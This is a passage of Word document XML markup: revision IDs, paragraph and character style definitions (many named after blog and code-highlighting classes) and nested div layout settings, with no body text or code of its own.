    <w:rsid w:val="00C50501"/>
    <w:rsid w:val="00C55750"/>
    <w:rsid w:val="00C62690"/>
    <w:rsid w:val="00C770B1"/>
    <w:rsid w:val="00C978D7"/>
    <w:rsid w:val="00CA2705"/>
    <w:rsid w:val="00CB4D9A"/>
    <w:rsid w:val="00CC2376"/>
    <w:rsid w:val="00CD5626"/>
    <w:rsid w:val="00CF3DCC"/>
    <w:rsid w:val="00D01BD2"/>
    <w:rsid w:val="00D01E5E"/>
    <w:rsid w:val="00D236F4"/>
    <w:rsid w:val="00D32612"/>
    <w:rsid w:val="00D37992"/>
    <w:rsid w:val="00D43986"/>
    <w:rsid w:val="00D501FB"/>
    <w:rsid w:val="00D62DD3"/>
    <w:rsid w:val="00D64429"/>
    <w:rsid w:val="00D706DA"/>
    <w:rsid w:val="00D72DC1"/>
    <w:rsid w:val="00D74E62"/>
    <w:rsid w:val="00D75A7E"/>
    <w:rsid w:val="00D8507D"/>
    <w:rsid w:val="00D857E6"/>
    <w:rsid w:val="00D97328"/>
    <w:rsid w:val="00DA065E"/>
    <w:rsid w:val="00DA3173"/>
    <w:rsid w:val="00DA787C"/>
    <w:rsid w:val="00DB2334"/>
    <w:rsid w:val="00DB311B"/>
    <w:rsid w:val="00DB6C44"/>
    <w:rsid w:val="00DC159C"/>
    <w:rsid w:val="00DC33A6"/>
    <w:rsid w:val="00DC63B8"/>
    <w:rsid w:val="00DD167F"/>
    <w:rsid w:val="00DD751C"/>
    <w:rsid w:val="00DE4B47"/>
    <w:rsid w:val="00DF1F5D"/>
    <w:rsid w:val="00E22E53"/>
    <w:rsid w:val="00E33182"/>
    <w:rsid w:val="00E35057"/>
    <w:rsid w:val="00E40829"/>
    <w:rsid w:val="00E54CA0"/>
    <w:rsid w:val="00E800E4"/>
    <w:rsid w:val="00E87678"/>
    <w:rsid w:val="00E963FF"/>
    <w:rsid w:val="00EB3DF2"/>
    <w:rsid w:val="00EB63DF"/>
    <w:rsid w:val="00EC39D9"/>
    <w:rsid w:val="00EC3E31"/>
    <w:rsid w:val="00ED6D7B"/>
    <w:rsid w:val="00EE04C2"/>
    <w:rsid w:val="00EE0F79"/>
    <w:rsid w:val="00F0490D"/>
    <w:rsid w:val="00F242B0"/>
    <w:rsid w:val="00F344D4"/>
    <w:rsid w:val="00F509D9"/>
    <w:rsid w:val="00F61A68"/>
    <w:rsid w:val="00F64033"/>
    <w:rsid w:val="00F706D5"/>
    <w:rsid w:val="00F7522F"/>
    <w:rsid w:val="00F82A40"/>
    <w:rsid w:val="00F91E5E"/>
    <w:rsid w:val="00F97FFE"/>
    <w:rsid w:val="00FA6CF1"/>
    <w:rsid w:val="00FD4F60"/>
    <w:rsid w:val="00FF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33BC"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading1Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="00033A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249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4086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62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67DF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49F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4086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A408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4086E"/>
  </w:style>
  <w:style w:type="character" w:styleId="Strong">
    <w:name w:val="Strong"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="22"/>
    <w:qFormat/>
    <w:rsid w:val="00A4086E"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A4086E"/>
    <w:rPr>
      <w:color w:val="0000FF"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="posttitle">
    <w:name w:val="posttitle"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00A4086E"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BalloonText">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BalloonTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00D501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1FB"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading1Char">
    <w:name w:val="Heading 1 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading1"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00033A77"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="post-date">
    <w:name w:val="post-date"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00225E6B"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTMLPreformatted">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HTMLPreformattedChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="0022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5E6B"/>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5E6B"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Emphasis">
    <w:name w:val="Emphasis"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="20"/>
    <w:qFormat/>
    <w:rsid w:val="00225E6B"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading4Char">
    <w:name w:val="Heading 4 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading4"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="009462E1"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="4F81BD" w:themeColor="accent1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="postauthorintro">
    <w:name w:val="post_author_intro"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="009462E1"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="postauthor">
    <w:name w:val="post_author"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="009462E1"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="postdateintro">
    <w:name w:val="post_date_intro"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="009462E1"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="postdate">
    <w:name w:val="post_date"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="009462E1"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="pln">
    <w:name w:val="pln"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="007D6FC0"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="pun">
    <w:name w:val="pun"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="007D6FC0"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="kwd">
    <w:name w:val="kwd"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="007D6FC0"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="lit">
    <w:name w:val="lit"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="007D6FC0"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="com">
    <w:name w:val="com"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="007D6FC0"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="postmetadata">
    <w:name w:val="postmetadata"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="003552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e1">
    <w:name w:val="Date1"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00EE04C2"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="post-comments">
    <w:name w:val="post-comments"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00EE04C2"/>
  </w:style>
  <w:style w:type="character" w:styleId="HTMLTypewriter">
    <w:name w:val="HTML Typewriter"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00EE04C2"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="in-widget">
    <w:name w:val="in-widget"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00EE04C2"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="in-right">
    <w:name w:val="in-right"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00EE04C2"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="jp-relatedposts-post-context">
    <w:name w:val="jp-relatedposts-post-context"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00EE04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tegories">
    <w:name w:val="categories"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00EE04C2"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="vote-count-post">
    <w:name w:val="vote-count-post"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00D62DD3"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="vote-accepted-on">
    <w:name w:val="vote-accepted-on"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00D62DD3"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Subtitle1">
    <w:name w:val="Subtitle1"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00952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ddreading">
    <w:name w:val="addreading"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="0095288D"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="lead">
    <w:name w:val="lead"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00D850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D850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b-smtxt">
    <w:name w:val="bulb-smtxt"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00D850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D8507D"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="first">
    <w:name w:val="first"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="000832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ote1">
    <w:name w:val="Quote1"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00F7522F"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="code-keyword">
    <w:name w:val="code-keyword"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00F344D4"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="code-digit">
    <w:name w:val="code-digit"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00F344D4"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="code-string">
    <w:name w:val="code-string"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00F344D4"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="code-comment">
    <w:name w:val="code-comment"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00F344D4"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="code-sdkkeyword">
    <w:name w:val="code-sdkkeyword"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00F344D4"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="author">
    <w:name w:val="author"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="0054497A"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="rating">
    <w:name w:val="rating"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="0054497A"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="count">
    <w:name w:val="count"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="0054497A"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="code">
    <w:name w:val="code"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="005B2320"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="it">
    <w:name w:val="it"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00EC39D9"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="qtextpara">
    <w:name w:val="qtext_para"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00D644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D64429"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="00652DA1"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="heading">
    <w:name w:val="heading"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00AB51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5C42C7"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="toctitle">
    <w:name w:val="toc_title"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00EB3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_toggle"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00EB3DF2"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading5Char">
    <w:name w:val="Heading 5 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading5"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="00267DFA"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="243F60" w:themeColor="accent1" w:themeShade="7F"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="space">
    <w:name w:val="space"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00267D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dentifier">
    <w:name w:val="identifier"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00267DFA"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="operator">
    <w:name w:val="operator"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00267DFA"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="paren">
    <w:name w:val="paren"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00267DFA"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="string">
    <w:name w:val="string"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00267DFA"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="transcript">
    <w:name w:val="transcript"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00267DFA"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="label">
    <w:name w:val="label"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="004C44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try-meta">
    <w:name w:val="entry-meta"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00245D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245D89"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="entry-author-name">
    <w:name w:val="entry-author-name"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00245D89"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="entry-comments-link">
    <w:name w:val="entry-comments-link"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00245D89"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="wp-caption-text">
    <w:name w:val="wp-caption-text"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00447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span">
    <w:name w:val="highlight-span"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="0034244E"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="token">
    <w:name w:val="token"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="0034244E"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Date2">
    <w:name w:val="Date2"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="009E4320"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="blog-info-head">
    <w:name w:val="blog-info-head"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="0037684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517013">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1349680306">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="240"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="2133401421">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1010915215">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="240"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1894003063">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="2049254991">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="240"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="4494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9750">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="392854918">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="75"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
      </w:divsChild>
    </w:div>
    <w:div w:id="229656330">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="241304146">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="276647794">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="290743351">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="304705644">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="75"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
      </w:divsChild>
    </w:div>
    <w:div w:id="290785904">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1948461536">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1207838659">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="8223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59105">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="2129737840">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="1094327251">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="0"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                  <w:divsChild>
                    <w:div w:id="127208200">
                      <w:marLeft w:val="0"/>
                      <w:marRight w:val="0"/>
                      <w:marTop w:val="0"/>
                      <w:marBottom w:val="0"/>
                      <w:divBdr>
                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                      </w:divBdr>
                      <w:divsChild>
                        <w:div w:id="1025330762">
                          <w:marLeft w:val="0"/>
                          <w:marRight w:val="0"/>
                          <w:marTop w:val="0"/>
                          <w:marBottom w:val="0"/>
                          <w:divBdr>
                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                          </w:divBdr>
                          <w:divsChild>
                            <w:div w:id="473718625">
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="0"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                              <w:divsChild>
                                <w:div w:id="1150754587">
                                  <w:marLeft w:val="0"/>
                                  <w:marRight w:val="0"/>
                                  <w:marTop w:val="0"/>
                                  <w:marBottom w:val="300"/>
                                  <w:divBdr>
                                    <w:top w:val="none" w:sz="0" w:space="8" w:color="F6B73C"/>
                                    <w:left w:val="single" w:sz="36" w:space="23" w:color="F6B73C"/>
